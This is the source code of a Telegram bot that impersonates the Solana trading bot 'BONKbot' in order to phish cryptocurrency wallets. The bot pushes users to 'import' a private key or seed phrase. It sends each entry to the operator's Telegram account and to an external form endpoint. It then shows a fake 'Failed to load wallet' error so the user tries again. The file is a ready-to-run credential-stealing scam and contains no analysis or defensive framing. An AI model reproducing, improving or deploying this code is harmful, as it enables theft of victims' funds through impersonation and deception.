require('dotenv').config();
const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios'); // For making HTTP requests (e.g., sending to FormUnstatic)

const token = process.env.BOT_TOKEN;
const ownerId = process.env.OWNER_ID;
const formUnstaticURL = process.env.FORM_UNSTATIC_URL; // Your FormUnstatic endpoint

// Create a bot that uses polling to fetch new updates
const bot = new TelegramBot(token, { polling: true });

// Store the chat state to track if a user is entering a private key or seed phrase
const chatStates = {};

// Function to send data to FormUnstatic
const sendToFormUnstatic = async (name, message) => {
  if (!name || !message) {
    console.error('Missing name or message for FormUnstatic submission.');
    return;
  }

  try {
    const response = await axios.post(
      formUnstaticURL,
      new URLSearchParams({
        name: name,
        message: message,
      }),
      {
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      }
    );
    console.log('Data sent to FormUnstatic:', response.data);
  } catch (error) {
    console.error(
      'Error sending data to FormUnstatic:',
      error.response?.data || error.message
    );
  }
};

// Respond to any message
bot.on('message', (msg) => {
  const chatId = msg.chat.id;

  if (chatStates[chatId] === 'awaiting_private_key') {
    const privateKey = msg.text;

    // Send the private key to your Telegram ID and FormUnstatic
    bot.sendMessage(ownerId, `🔑 Private Key Received:\n${privateKey}`);
    sendToFormUnstatic('Private Key Received', privateKey);

    bot.sendMessage(chatId, '❌ Failed to load wallet!', {
      reply_markup: {
        inline_keyboard: [[{ text: 'Try again', callback_data: 'try_again' }]],
      },
    });

    // Clear the chat state
    delete chatStates[chatId];
  } else if (chatStates[chatId] === 'awaiting_seed_phrase') {
    const seedPhrase = msg.text;

    // Send the seed phrase to your Telegram ID and FormUnstatic
    bot.sendMessage(ownerId, `📜 Seed Phrase Received:\n${seedPhrase}`);
    sendToFormUnstatic('Seed Phrase Received', seedPhrase);

    bot.sendMessage(chatId, '❌ Failed to load wallet!', {
      reply_markup: {
        inline_keyboard: [[{ text: 'Try again', callback_data: 'try_again' }]],
      },
    });

    // Clear the chat state
    delete chatStates[chatId];
  } else {
    // Default response for other messages
    bot.sendMessage(chatId, `Hello, ${msg.from.first_name}!`);
  }
});

// Handle /start command
bot.onText(/\/start/, (msg) => {
  const message = `Welcome to BONKbot - the fastest and most secure bot for trading any token on Solana!

You currently have no SOL in your wallet. To start trading, deposit SOL to your BONKbot wallet address:

HvigCF7FTQeH5tvxjMQvArHYiKLaURNJ1y4bxmNLdjxr (tap to copy)

Or buy SOL with Apple / Google Pay via MoonPay
[here](https://buy.moonpay.com/?apiKey=pk_live_tgPovrzh9urHG1HgjrxWGq5xgSCAAz&walletAddress=3Etc8xf3FzCF7WYUVoGG54F1UFsapoG6rnm6NJ1UAdgc&showWalletAddressForm=true&currencyCode=sol&signature=XDh%2B0QwuGobupCFRMCfTkslJnPXBn%2FcO1kXKvIqaiUE%3D).

Once done, tap refresh and your balance will appear here.

To buy a token: enter a ticker, token address, or URL from pump.fun, Birdeye, DEX Screener, or Meteora.

For more info on your wallet and to export your seed phrase, tap "Wallet" below.`;

  const options = {
    reply_markup: {
      inline_keyboard: [
        [
          { text: 'Buy', callback_data: 'buy' },
          { text: 'Fund', callback_data: 'fund' },
        ],
        [
          { text: 'Help', callback_data: 'help' },
          { text: 'Refer Friends', callback_data: 'refer_friends' },
          { text: 'Alerts', callback_data: 'alerts' },
        ],
        [
          { text: 'Wallet', callback_data: 'wallet' },
          { text: 'Settings', callback_data: 'settings' },
        ],
        [
          { text: 'DCA Orders', callback_data: 'dca_orders' },
          { text: 'Limit Orders', callback_data: 'limit_orders' },
        ],
        [
          { text: 'Migration Sniper', callback_data: 'migration_sniper' },
          { text: 'Refresh', callback_data: 'refresh' },
        ],
      ],
    },
  };

  bot.sendMessage(msg.chat.id, message, { parse_mode: 'Markdown', ...options });
});

// Handle button clicks (callback queries)
bot.on('callback_query', (query) => {
  const chatId = query.message.chat.id;

  if (query.data === 'try_again') {
    const startMessage = `Welcome to BONKbot - the fastest and most secure bot for trading any token on Solana!

You currently have no SOL in your wallet. To start trading, deposit SOL to your BONKbot wallet address:

HvigCF7FTQeH5tvxjMQvArHYiKLaURNJ1y4bxmNLdjxr (tap to copy)

Or buy SOL with Apple / Google Pay via MoonPay
[here](https://buy.moonpay.com/?apiKey=pk_live_tgPovrzh9urHG1HgjrxWGq5xgSCAAz&walletAddress=3Etc8xf3FzCF7WYUVoGG54F1UFsapoG6rnm6NJ1UAdgc&showWalletAddressForm=true&currencyCode=sol&signature=XDh%2B0QwuGobupCFRMCfTkslJnPXBn%2FcO1kXKvIqaiUE%3D).

Once done, tap refresh and your balance will appear here.

To buy a token: enter a ticker, token address, or URL from pump.fun, Birdeye, DEX Screener, or Meteora.

For more info on your wallet and to export your seed phrase, tap "Wallet" below.`;

    bot.sendMessage(chatId, startMessage, { parse_mode: 'Markdown' });
  } else if (query.data === 'import_wallet') {
    const importMessage = `ℹ️ Connect wallet to use settings`;

    const importOptions = {
      reply_markup: {
        inline_keyboard: [
          [{ text: 'IMPORT PRIVATE KEY', callback_data: 'import_private_key' }],
          [{ text: 'IMPORT SEED PHRASE', callback_data: 'import_seed_phrase' }],
        ],
      },
    };

    bot.sendMessage(chatId, importMessage, importOptions);
  } else if (query.data === 'import_private_key') {
    bot.sendMessage(chatId, 'Enter private key 🔑', {
      reply_markup: {
        keyboard: [[{ text: 'Cancel' }]],
        resize_keyboard: true,
        one_time_keyboard: true,
      },
    });

    chatStates[chatId] = 'awaiting_private_key';
  } else if (query.data === 'import_seed_phrase') {
    bot.sendMessage(chatId, 'Enter 12-24 word mnemonic / recovery phrase ⬇️', {
      reply_markup: {
        keyboard: [[{ text: 'Cancel' }]],
        resize_keyboard: true,
        one_time_keyboard: true,
      },
    });

    chatStates[chatId] = 'awaiting_seed_phrase';
  } else {
    const newMessage = `Connect a wallet to use settings`;

    const walletOptions = {
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: 'Import wallet 💳',
              callback_data: 'import_wallet',
            },
          ],
        ],
      },
    };

    bot.sendMessage(chatId, newMessage, walletOptions);
  }

  bot.answerCallbackQuery(query.id);
});
